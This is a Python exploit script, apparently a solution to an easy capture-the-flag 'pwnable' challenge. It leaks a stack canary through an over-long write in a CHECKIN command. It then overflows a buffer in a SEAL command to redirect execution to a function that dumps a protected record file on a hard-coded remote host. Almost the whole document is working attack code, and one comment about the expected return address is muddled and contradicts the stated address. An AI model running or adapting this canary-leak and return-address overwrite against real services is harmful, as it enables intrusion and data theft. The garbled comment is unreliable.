"""Buffy Vampire#1 (pwnable, easy).

cmd_checkin: memset(buf,0,0x40); read(0,buf,0x40); write(1,buf,0x80)
  -> leaks 128 bytes of stack past the 64-byte input: canary at offset 72,
     saved rbp at offset 80, cmd_checkin's return address at offset 88.

cmd_seal: read(0,buf,0x200) into the SAME 0x50-byte stack frame layout
  -> classic stack buffer overflow. Overwrite the return address with
     read_sealed_record() (0x4013a7, no PIE so address is fixed), which
     opens/reads/writes /opt/cryptgate/.roster/record.dat then _exit(0).
  Must keep the leaked canary intact at offset 72 or __stack_chk_fail aborts
  before the overwritten return address is ever used.
"""
import socket
import sys

HOST = "136.85.48.133"
PORT = 9999
READ_SEALED_RECORD = 0x4013A7


class Conn:
    def __init__(self, s: socket.socket):
        self.s = s
        self.buf = b""

    def _fill(self, n: int = 4096):
        chunk = self.s.recv(n)
        if not chunk:
            raise EOFError("connection closed")
        self.buf += chunk

    def recv_until(self, marker: bytes, maxlen: int = 65536) -> bytes:
        while marker not in self.buf and len(self.buf) < maxlen:
            self._fill()
        idx = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:idx], self.buf[idx:]
        return out

    def recv_exact(self, n: int) -> bytes:
        while len(self.buf) < n:
            self._fill()
        out, self.buf = self.buf[:n], self.buf[n:]
        return out

    def sendall(self, data: bytes):
        self.s.sendall(data)


def main():
    sock = socket.create_connection((HOST, PORT), timeout=10)
    sock.settimeout(10)
    s = Conn(sock)

    s.recv_until(b"gate> ")

    # --- CHECKIN: leak canary + return address ---
    s.sendall(b"CHECKIN\n")
    s.recv_until(b"gate: ")  # "Name of the one passing the gate: "
    s.sendall(b"leak\n")

    s.recv_until(b"Logged at the gate: ")
    leak = s.recv_exact(128)

    canary = leak[72:80]
    saved_rbp = leak[80:88]
    retaddr = leak[88:96]
    print("canary   :", canary.hex())
    print("saved rbp:", saved_rbp.hex())
    print("retaddr  :", retaddr.hex(), "(expect ...a7184000... no, expect ends a7 18 40 00 little-endian of 0x4018a7)")

    s.recv_until(b"gate> ")

    # --- SEAL: overflow return address ---
    payload = b"B" * 72
    payload += canary
    payload += b"C" * 8  # saved rbp, don't care
    payload += READ_SEALED_RECORD.to_bytes(8, "little")

    s.sendall(b"SEAL\n")
    s.recv_until(b"seal: ")  # "Paste the roster record to seal: "
    s.sendall(payload)

    sock.settimeout(5)
    out = s.buf
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass

    print("---- response ----")
    print(out.decode(errors="replace"))
    sock.close()


if __name__ == "__main__":
    main()
